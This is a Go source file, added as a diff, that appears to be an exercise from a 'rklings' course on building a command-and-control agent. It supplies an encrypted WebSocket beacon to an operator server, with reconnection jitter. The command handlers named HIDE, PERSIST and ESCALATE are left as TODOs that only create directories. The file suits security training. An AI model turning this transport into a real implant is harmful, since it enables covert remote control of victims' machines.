@@ -1,0 +1,227 @@
+// Agent with command dispatch over WebSocket.
+package main
+
+import (
+	"context"
+	"crypto/aes"
+	"crypto/cipher"
+	"crypto/ecdh"
+	"crypto/rand"
+	"crypto/sha256"
+	"fmt"
+	"io"
+	_ "embed"
+	"encoding/json"
+	"errors"
+	"math/big"
+	"os"
+	"sync"
+	"time"
+
+	"github.com/coder/websocket"
+	"golang.org/x/crypto/hkdf"
+)
+
+//go:embed keys/agent.key
+var agentPrivKey []byte
+
+//go:embed keys/operator.pub
+var operatorPubKey []byte
+
+var serverAddr = envOr("RKLINGS_SERVER_ADDR", "10.0.2.2:8443")
+
+var (
+	sharedKey     [32]byte
+	agentPubBytes []byte
+	wsConn        *websocket.Conn
+	writeMu       sync.Mutex
+)
+
+type Command struct {
+	Op   string          `json:"op"`
+	Arg  string          `json:"arg,omitempty"`
+	Data json.RawMessage `json:"data,omitempty"`
+}
+
+// --- Crypto (provided) ---
+
+var errCiphertextShort = errors.New("ciphertext too short")
+
+func deriveKeys(privRaw, peerPubRaw []byte) (key [32]byte, id [8]byte, err error) {
+	curve := ecdh.X25519()
+	priv, err := curve.NewPrivateKey(privRaw)
+	if err != nil {
+		return key, id, err
+	}
+	pub, err := curve.NewPublicKey(peerPubRaw)
+	if err != nil {
+		return key, id, err
+	}
+	secret, err := priv.ECDH(pub)
+	if err != nil {
+		return key, id, err
+	}
+	if _, err := io.ReadFull(hkdf.New(sha256.New, secret, nil, []byte("rklings-aead")), key[:]); err != nil {
+		return key, id, err
+	}
+	if _, err := io.ReadFull(hkdf.New(sha256.New, secret, nil, []byte("rklings-id")), id[:]); err != nil {
+		return key, id, err
+	}
+	return
+}
+
+func newGCM(key [32]byte) (cipher.AEAD, error) {
+	block, err := aes.NewCipher(key[:])
+	if err != nil {
+		return nil, err
+	}
+	return cipher.NewGCM(block)
+}
+
+func sealAEAD(key [32]byte, plaintext []byte) ([]byte, error) {
+	gcm, err := newGCM(key)
+	if err != nil {
+		return nil, err
+	}
+	nonce := make([]byte, gcm.NonceSize())
+	if _, err := rand.Read(nonce); err != nil {
+		return nil, err
+	}
+	return gcm.Seal(nonce, nonce, plaintext, nil), nil
+}
+
+func openAEAD(key [32]byte, ciphertext []byte) ([]byte, error) {
+	gcm, err := newGCM(key)
+	if err != nil {
+		return nil, err
+	}
+	if len(ciphertext) < gcm.NonceSize() {
+		return nil, errCiphertextShort
+	}
+	return gcm.Open(nil, ciphertext[:gcm.NonceSize()], ciphertext[gcm.NonceSize():], nil)
+}
+
+// --- Transport (provided) ---
+
+func initTransport() {
+	curve := ecdh.X25519()
+	priv, err := curve.NewPrivateKey(agentPrivKey)
+	if err != nil {
+		panic("parse agent key: " + err.Error())
+	}
+	agentPubBytes = priv.PublicKey().Bytes()
+	sharedKey, _, err = deriveKeys(agentPrivKey, operatorPubKey)
+	if err != nil {
+		panic("derive keys: " + err.Error())
+	}
+}
+
+func wsURL() string {
+	scheme := "wss"
+	if len(serverAddr) > 0 && (serverAddr[0] >= '0' && serverAddr[0] <= '9' || serverAddr[0] == '[') {
+		scheme = "ws"
+	}
+	return fmt.Sprintf("%s://%s/", scheme, serverAddr)
+}
+
+func wsSend(v any) error {
+	plain, err := json.Marshal(v)
+	if err != nil {
+		return err
+	}
+	ct, err := sealAEAD(sharedKey, plain)
+	if err != nil {
+		return err
+	}
+	writeMu.Lock()
+	defer writeMu.Unlock()
+	return wsConn.Write(context.Background(), websocket.MessageBinary, ct)
+}
+
+func wsLoop() {
+	for {
+		if err := wsSession(); err != nil {
+			time.Sleep(jitterDuration(3000, 10000))
+		}
+	}
+}
+
+func wsSession() error {
+	ctx := context.Background()
+	conn, _, err := websocket.Dial(ctx, wsURL(), nil)
+	if err != nil {
+		return err
+	}
+	defer conn.CloseNow()
+	conn.SetReadLimit(4 << 20)
+	wsConn = conn
+
+	hello, _ := json.Marshal(map[string]string{"t": "hello"})
+	ct, err := sealAEAD(sharedKey, hello)
+	if err != nil {
+		return err
+	}
+	frame := append(agentPubBytes, ct...)
+	if err := conn.Write(ctx, websocket.MessageBinary, frame); err != nil {
+		return err
+	}
+
+	for {
+		_, msg, err := conn.Read(ctx)
+		if err != nil {
+			return err
+		}
+		plain, err := openAEAD(sharedKey, msg)
+		if err != nil {
+			continue
+		}
+		var cmd Command
+		if json.Unmarshal(plain, &cmd) != nil {
+			continue
+		}
+		result := execute(cmd)
+		if err := wsSend(map[string]any{"data": result}); err != nil {
+			return err
+		}
+	}
+}
+
+// --- Helpers (provided) ---
+
+func envOr(name, fallback string) string {
+	if value := os.Getenv(name); value != "" {
+		return value
+	}
+	return fallback
+}
+
+func mkdirCmd(name string) error {
+	path := "rklings." + name
+	err := os.Mkdir(path, 0755)
+	_ = os.Remove(path)
+	return err
+}
+
+func jitterDuration(minMs, maxMs int64) time.Duration {
+	n, _ := rand.Int(rand.Reader, big.NewInt(maxMs-minMs))
+	return time.Duration(minMs+n.Int64()) * time.Millisecond
+}
+
+// TODO 1: Define a handler type: func(arg string) any
+//         Build a handlers map from Op string to handler.
+//         Commands: PING (returns "PONG"), STATUS (returns map with pid/uid),
+//         HIDE (mkdir side effect, returns "OK"), PERSIST (mkdir, returns "OK"),
+//         ESCALATE (mkdir, returns "OK").
+
+// TODO 2: Implement execute(cmd Command) any
+//         Look up the handler by cmd.Op, call it, return the result.
+//         Unknown commands return map[string]string{"error": "unknown command"}
+
+func execute(cmd Command) any {
+	return map[string]string{"error": "not implemented"}
+}
+
+func main() {
+	initTransport()
+	// TODO: call wsLoop() here
+}
